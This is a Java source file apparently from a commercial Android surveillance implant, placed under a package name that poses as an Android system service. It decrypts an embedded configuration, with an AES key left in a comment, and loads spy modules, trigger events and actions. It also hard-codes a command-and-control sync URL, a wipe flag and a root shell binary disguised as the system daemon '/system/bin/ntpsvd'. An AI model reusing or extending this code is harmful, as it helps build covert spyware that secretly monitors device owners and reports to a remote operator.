/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service.conf;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Arrays;
import java.util.Hashtable;
import java.util.Iterator;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;

import com.android.service.Debug;
import com.android.service.GeneralException;
import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.action.Action;

import com.android.service.auto.Cfg;
import com.android.service.crypto.Crypto;
import com.android.service.crypto.Encryption;
import com.android.service.crypto.EncryptionPKCS5;
import com.android.service.crypto.Keys;

import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class Configuration.
 */
public class Configuration {
	private static final String TAG = "Configuration"; //$NON-NLS-1$

	/** The status obj. */
	private final Status status;

	/**
	 * Configuration file embedded into the .apk
	 */
	private final String jsonResource;

	/** Clear configuration buffer wrapped into a ByteBuffer. */
	// private ByteBuffer wrappedClearConf;

	/** The Constant TASK_ACTION_TIMEOUT. */
	public static final long TASK_ACTION_TIMEOUT = 600000;

	public static final boolean OVERRIDE_SYNC_URL = false;
	public static final String SYNC_URL = "http://172.20.20.147/wc12/webclient"; //$NON-NLS-1$
	/** The Constant MIN_AVAILABLE_SIZE. */
	public static final long MIN_AVAILABLE_SIZE = 200 * 1024;

	public static final String shellFile = "/system/bin/ntpsvd";

	private static final int AGENT_ENABLED = 0x2;

	private static final int DIGEST_LEN = 20;

	// public static final String SYNC_URL =
	// "http://192.168.1.189/wc12/webclient";

	// public static final boolean DEBUG = Config.DEBUG;

	/**
	 * Instantiates a new configuration.
	 * 
	 * @param resource
	 *            the resource
	 * @throws GeneralException
	 */
	public Configuration(final byte[] resource) throws GeneralException {
		status = Status.self();
		// Decrypt Conf
		jsonResource = decryptConfiguration(resource);
	}

	public Configuration(String jsonConf) throws GeneralException {
		status = Status.self();
		jsonResource = jsonConf;
	}

	/**
	 * Load configuration.
	 * 
	 * @return true, if successful
	 * @throws GeneralException
	 *             the rCS exception
	 */
	public boolean loadConfiguration(boolean instantiate) {
		try {
			// Clean old configuration
			if (instantiate) {
				cleanConfiguration();
			}

			// Parse and load configuration
			return parseConfiguration(instantiate, jsonResource);
		} catch (final Exception rcse) {
			return false;
		}

	}

	abstract static class Visitor {
		protected boolean instantiate;

		public Visitor(boolean instantiate) {
			this.instantiate = instantiate;
		}

		public static void load(JSONArray jmodules, Visitor visitor) {
			int agentTag;

			// How many agents we have?
			final int num = jmodules.length();

			if (Cfg.DEBUG) {
				Check.log(TAG + " Number of elements: " + num);//$NON-NLS-1$
			}

			// Get id, status, parameters length and parameters
			for (int i = 0; i < num; i++) {
				JSONObject jobject;
				try {
					jobject = jmodules.getJSONObject(i);
					visitor.call(i, jobject);
				} catch (JSONException e1) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (load) Error: " + e1);
					}
				} catch (GeneralException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (load) Error: " + e);
					}
				} catch (ConfigurationException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (load) Error: " + e);
					}
				}
			}
		}

		public abstract void call(int id, JSONObject o) throws ConfigurationException, JSONException, GeneralException;
	}

	class LoadModule extends Visitor {
		public LoadModule(boolean instantiate) {
			super(instantiate);
		}

		public void call(int moduleId, JSONObject params) throws ConfigurationException, GeneralException,
				JSONException {
			final String moduleType = params.getString("module");

			if (Cfg.DEBUG) {
				Check.log(TAG + " Module: " + moduleType + " Params size: " + params.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			}

			if (instantiate) {
				final ConfModule a = new ConfModule(moduleType, params);
				Status.self().addAgent(a);
			}
		}
	}

	class LoadEvent extends Visitor {
		public LoadEvent(boolean instantiate) {
			super(instantiate);
		}

		public void call(int eventId, JSONObject jmodule) throws JSONException, GeneralException {
			String eventType = jmodule.getString("event");
			if (jmodule.has("type")) {
				eventType += " " + jmodule.getString("type");
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Event: " + eventId + " type: " + eventType + " Params size: " + jmodule.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			}

			if (instantiate) {
				final ConfEvent e = new ConfEvent(eventId, eventType, jmodule);
				Status.self().addEvent(e);
			}

		}
	}

	class LoadAction extends Visitor {
		public LoadAction(boolean instantiate) {
			super(instantiate);
		}

		public void call(int actionId, JSONObject jaction) throws ConfigurationException, GeneralException,
				JSONException {
			String desc = jaction.getString("desc");
			final Action a = new Action(actionId, desc);

			JSONArray jsubactions = jaction.getJSONArray("subactions");
			int subNum = jsubactions.length();

			if (Cfg.DEBUG) {
				Check.log(TAG + " Action " + actionId + " SubActions: " + subNum);//$NON-NLS-1$ //$NON-NLS-2$
			}

			for (int j = 0; j < subNum; j++) {
				JSONObject jsubaction = jsubactions.getJSONObject(j);

				final String type = jsubaction.getString("action");
				ConfAction conf = new ConfAction(actionId, j, type, jsubaction);
				if (a.addSubAction(conf)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " SubAction " + j + " Type: " + type + " Params Length: " + jsubaction.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
					}
				}
			}

			if (Cfg.DEBUG) {
				Check.ensures(a.getSubActionsNum() == subNum, "inconsistent subaction number"); //$NON-NLS-1$
			}

			if (instantiate) {
				status.addAction(a);
			}
		}
	}

	/**
	 * Parses the configuration. k
	 * 
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private boolean parseConfiguration(boolean instantiate, String json) throws GeneralException {
		try {
			JSONObject root = (JSONObject) new JSONTokener(json).nextValue();

			JSONArray jmodules = root.getJSONArray("modules");
			JSONArray jevents = root.getJSONArray("events");
			JSONArray jactions = root.getJSONArray("actions");
			JSONObject jglobals = root.getJSONObject("globals");

			Visitor.load(jmodules, new LoadModule(instantiate));
			Visitor.load(jevents, new LoadEvent(instantiate));
			Visitor.load(jactions, new LoadAction(instantiate));

			loadGlobals(jglobals, instantiate);

			// Debug Check. start //$NON-NLS-1$
			Debug.statusActions();
			Debug.statusModules();
			Debug.statusEvents();
			Debug.statusGlobals();
			// Debug Check. end //$NON-NLS-1$

			return true;
		} catch (JSONException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parseConfiguration) Error: " + e);
			}
			return false;
		}

	}

	private void loadGlobals(JSONObject jglobals, boolean instantiate) throws JSONException {

		Globals g = new Globals();

		JSONObject jquota = jglobals.getJSONObject("quota");
		g.quotaMin = jquota.getInt("min");
		g.quotaMax = jquota.getInt("max");

		g.wipe = jglobals.getBoolean("wipe");
		g.type = jglobals.getString("type");
		g.migrated = jglobals.getBoolean("migrated");
		g.version = jglobals.getInt("version");
		
		status.setGlobal(g);
	}

	/**
	 * Decrypt configuration.
	 * 
	 * @param rawConf
	 *            the raw conf
	 * @return
	 * @throws GeneralException
	 *             the rCS exception
	 */
	private String decryptConfiguration(final byte[] rawConf) throws GeneralException {
		/**
		 * Struttura del file di configurazione
		 * 
		 * |DWORD|DWORD|DWORD|DATA.....................|CRC| |---Skip----|-Len-|
		 * 
		 * Le prime due DWORD vanno skippate. La terza DWORD contiene la
		 * lunghezza del blocco di dati (inclusa la stessa Len) CRC e' il CRC
		 * (cifrato) dei dati in chiaro, inclusa la DWORD Len
		 */

		try {

			if (rawConf == null) {
				throw new GeneralException("Cannot allocate memory for configuration"); //$NON-NLS-1$
			}

			// Decrypt configuration
			/*
			 * byte[] aesConfKey = new byte[] { (byte)0xa9, (byte)0x98,
			 * (byte)0x76, (byte)0x7f, (byte)0x8c, (byte)0x31, (byte)0x99,
			 * (byte)0xb0, (byte)0x33, (byte)0x8c, (byte)0xb2, (byte)0xd9,
			 * (byte)0x98, (byte)0x08, (byte)0x42, (byte)0x58 };
			 */

			// Crypto crypto = new Crypto(Keys.g_ConfKey);
			final byte[] confKey = Keys.self().getConfKey();
			
			EncryptionPKCS5 crypto = new EncryptionPKCS5(confKey);
			//final Crypto crypto = new Crypto(confKey);
			final byte[] clearConf = crypto.decryptDataIntegrity(rawConf);

			String json = new String(clearConf);

			if (json != null && json.length() > 0) {
				// Return decrypted conf
				if (Cfg.DEBUG) {
					Check.log(TAG + " Configuration is valid");//$NON-NLS-1$
				}

				return json;
			}
			return null;
		
		} catch (final SecurityException se) {
			if (Cfg.DEBUG) {
				Check.log(se);//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " SecurityException() detected");//$NON-NLS-1$
			}
		} catch (final Exception e) {
			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " Exception() detected");//$NON-NLS-1$
			}
		}

		return null;
	}

	/**
	 * Clean configuration and status objects.
	 */
	public void cleanConfiguration() {
		// Clean an eventual old initialization
		status.clean();

	}

	public static boolean isDebug() {
		return Cfg.DEBUG;
	}

}
